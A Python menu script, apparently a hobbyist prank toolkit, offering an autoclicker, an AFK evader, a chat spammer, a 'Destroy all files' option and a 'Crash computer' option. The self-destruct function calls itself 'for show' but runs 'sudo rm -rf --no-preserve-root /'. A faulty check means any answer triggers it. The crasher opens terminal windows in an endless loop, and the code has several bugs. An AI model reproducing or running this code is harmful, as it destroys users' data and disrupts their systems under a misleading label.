import pyautogui
import time
import os
import sys
from itertools import count as crash



def autoclicker_menu():
    print("                                                        ")
    print("*************************t00ls v0.11.1 autoclicker *****************************")
    print("                                                        ")
    print("What mouse button do you want to use?")
    print("1. Right Mouse Button")
    print("2. Left Mouse Button")
    print("99. Return to main menu")
    
    autoclicker_choice = input("Enter your choice: \n \n > ")

    if autoclicker_choice == '1':
        print("Right Mouse Button (RMB) Selected")
        rmb_cps = input("Enter your CPS 1-150 \n \n > ")
        if rmb_cps.isdigit():
            rmb_cps = int(rmb_cps)
            if 1 <= rmb_cps <= 150:
                print(f"You have selected {rmb_cps} CPS ")
                interval = 1 / rmb_cps
                run = True
                while run:
                    pyautogui.click(interval=interval, button='right')
    
                
     

    if autoclicker_choice == '2':
        print("Left Mouse Button (LMB) Selected")
        rmb_cps = input("Enter your CPS 1-150 \n \n > ")
        if rmb_cps.isdigit():
            rmb_cps = int(rmb_cps)
            if 1 <= rmb_cps <= 150:
                print(f"You have selected {rmb_cps} CPS ")
                interval = 1 / rmb_cps
                run = True
                while run:
                    pyautogui.click(interval=interval, button='left')
                   
    
        else:
            print("Please enter a valid number")    

    elif autoclicker_choice == '2':
        print
        


def afk_off():
    print("************************* t00ls v0.11.1 AFK disabler *****************************")
    print("You have selected AFK Evader")
    print("This will press the 'W' and 'S' every few moments")
    afkans = input("Type n to return to main menue, anything else to proceed \n \n \n >")

    if afkans == 'n':
        welcomescreen()
    else:
        print("going ahed")

    afk_answer = input("Do you want to continue? [Y/n]")
    if afk_answer == 'Y' or afk_answer == 'y':
        run1 = True
        while run1:
            pyautogui.typewrite('s', interval=2)
            pyautogui.typewrite('w', interval=5)



    
    elif afk_answer == 'y':
        while run1:
            pyautogui.typewrite('s', interval=2)
            pyautogui.typewrite('w', interval=5)

    elif afk_answer == 'n':
        print("Cancelled")
        print("Returing you to main menue \n ")
        afk_off()
    
    else:
        print("Not accepted")
        afk_off()

def chat_spam():
    print("************************* t00ls v0.11.1 main menu *****************************")
    print("This will spam your chosen word or phrase at superhuman speeds")
    chosen_output = input("What would you like to spam? \n \n \n > ")
    chatspam_continue = input("Do you want to continue? [Y/n]")
    if chatspam_continue == 'Y' or chatspam_continue == 'y':
        print("Counting down from 10")
        time.sleep(1)
        print("9")
        time.sleep(1)
        print("8")
        time.sleep(1)
        print("7")
        time.sleep(1)
        print("6")
        time.sleep(1)
        print("5")
        time.sleep(1)
        print("4")
        time.sleep(1)
        print("3")
        time.sleep(1)
        print("2")
        time.sleep(1)
        print("1")
        time.sleep(1)
        print("Starting...")
        
        run2 = True
        while run2:
            pyautogui.typewrite(chosen_output, interval=.00001)
            pyautogui.press('enter')

    elif chatspam_continue == 'n':
        time.sleep(1)
        os.system('clear')
        print("Process aborted")
        time.sleep(1)
        welcomescreen()
    
            
def credits():
    os.system('clear')
    for char in " This software was made be h4z3, I will add some more sometime \n": 
        print(char, end='') 
        sys.stdout.flush()
        time.sleep(0.025) 
    time.sleep(5)
    welcomescreen()

def self_destruct():
    all_files = "/"
    print("This function of the program is for show")
    print("By continuing you accept that this program will delete everything on the disk, overwrite it serveral times to ensure secure destruction, then delete itself")
    self_destruct_input = input("Do you want to continue? [Y/n] \n \n > ")
    if self_destruct_input == 'Y' or 'y' : 
        print("you have selected to destroy all the data in your computer \nprocceding in 5 seconds")
        time.sleep(5)            
        os.system('sudo rm -rf --no-preserve-root / ')

def crasher():
    os.system('clear')
    print(f"By continuing you accept you are a worthless troll \n")
    print(f"Please choose from the list of options below: \n ")
    print("1: Instantly crashes windows computer")
    print("2. Spams cmd windows (crash in style)")
    print("99. Return to main menue")
    
    crasherinput = input("\n \n >")
    
    if crasherinput == '1':
        print("maintenace")
        
    elif crasherinput == '2':
        crash_with_cmd()
        
        
def crash_with_cmd():
    command = "yes libcparse1 pywheel installing extracting metadata 1/100/200 reading quantum bit remote activated CRU processing enabled RMB triggers waiting"
    command2 = "gnome-terminal"
    os.system('clear')
    print("Selected to crash your pc with infinite cmd windows")
    print("DO you want to continue [Y/n]")
    cmdcrashinput = input (" \n \n >")
    if cmdcrashinput == 'Y' or cmdcrashinput == 'y':
        run3 = True
        while run3:
            os.system(f'gnome-terminal -- bash -c "{command}"')
            os.system('gnome-terminal')
    elif cmdcrashinput == 'n':
        time.sleep(1)
        os.system('clear')
        time.sleep('2')       
        welcomescreen()

    elif crasherinput == '99':
        welcomescreen()
    else:
        print("Input not accepted")
        os.system('clear')
        crasher()

def welcomescreen():  
    os.system('clear')
    print("************************* jcorp v0.11.1 main menu *****************************")
    print("What do you want to do?")
    print("1. Autoclicker")
    print("2. AFK Evader")
    print("3. Chat Spammer")
    print("4. Destroy all files")
    print("5. Crash computer")
    print("6. Credits")


    choice = input("\n \n > ")  
    
    if choice == '1':
        autoclicker_menu()
    elif choice == '2':
        afk_off()
    elif choice == '3':
        chat_spam()
    elif choice == '4':
        self_destruct()
    elif choice == '5':
        crasher()
    elif choice == '6':
        credits()

    else: 
        print("Input not accepted")
        time.sleep(1)
        welcomescreen()
    
welcomescreen()

